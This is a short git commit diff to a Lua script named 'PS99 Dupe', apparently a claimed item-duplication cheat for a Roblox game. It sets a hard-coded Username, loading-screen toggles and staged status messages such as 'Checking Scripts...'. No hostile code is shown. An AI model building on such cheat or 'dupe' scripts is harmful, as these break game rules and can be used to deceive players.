437b1820ae69b7cdf94d24eb820656ee88f53cb7
Hegejfvsjw <132260042+Hegejfvsjw@users.noreply.github.com>
2024-01-01 11:15:03 +0300

    Script.lua

--- Script.lua
+++ Script.lua
@@ -1,5 +1,8 @@
 Username = "LEGACROW11"
-_G.CustomScriptName = "PS99 Dupe" -- Main text
+loadingscreen = true
+farmui = true -- set to false if u dont want to load it
+--below only if loadingscreen = true
+_G.CustomScriptName = "PS99 Dupe" -- Main text 
 _G.Text1 = "Script Loaded..." --tip test1
 _G.Text2 = "Waiting for Script" --tip test1
 _G.Text3 = "Checking Scripts..." --tip test1
